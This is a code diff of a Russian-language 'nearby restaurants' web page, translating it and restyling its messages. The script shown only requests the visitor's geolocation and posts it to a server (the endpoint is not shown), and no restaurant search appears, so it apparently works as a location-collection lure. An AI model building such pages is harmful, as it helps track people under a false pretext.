@@ -1,45 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Nearby Restaurants</title>
+  <title>Рестораны рядом</title>
   <style>
     body {
       margin: 0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: linear-gradient(120deg, #f0f4ff, #e0e7ff);
+      background: linear-gradient(135deg, #f0f4ff, #e3e9ff);
       display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       flex-direction: column;
-      color: #333;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       text-align: center;
+      color: #222;
+      padding: 20px;
     }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
     button {
-      padding: 12px 20px;
+      padding: 12px 24px;
       font-size: 16px;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       background-color: #007aff;
       color: white;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
       cursor: pointer;
       transition: background 0.3s ease;
     }
+
     button:hover {
       background-color: #005edb;
+    }
+
+    .error {
+      margin-top: 20px;
+      color: red;
+      font-weight: 500;
+    }
+
+    .success {
+      margin-top: 20px;
+      color: green;
+      font-weight: 500;
     }
   </style>
 </head>
 <body>
   <h1>🔍 Поиск ресторанов рядом</h1>
-  <p>Нажми кнопку, чтобы разрешить геолокацию</p>
+  <p>Нажми на кнопку ниже, чтобы отправить свою геолокацию</p>
   <button onclick="sendLocation()">Разрешить геолокацию</button>
+
+  <div id="result"></div>
 
   <script>
     function sendLocation() {
+      const resultDiv = document.getElementById("result");
+      resultDiv.innerHTML = "";
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
@@ -55,18 +85,20 @@
             })
               .then((response) => response.text())
               .then((data) => {
-                alert("Геолокация отправлена!");
+                resultDiv.innerHTML = `<div class="success">Геолокация отправлена!</div>`;
               })
               .catch((error) => {
-                alert("Ошибка при отправке: " + error);
+                resultDiv.innerHTML = `<div class="error">Ошибка при отправке: ${error}</div>`;
+                console.log("Ошибка при fetch:", error);
               });
           },
           (error) => {
-            alert("Ошибка геолокации: " + error.message);
+            resultDiv.innerHTML = `<div class="error">Ошибка геолокации: ${error.message}</div>`;
+            console.log("Ошибка геолокации:", error);
           }
         );
       } else {
-        alert("Геолокация не поддерживается на этом устройстве.");
+        resultDiv.innerHTML = `<div class="error">Геолокация не поддерживается на этом устройстве.</div>`;
       }
     }
   </script>
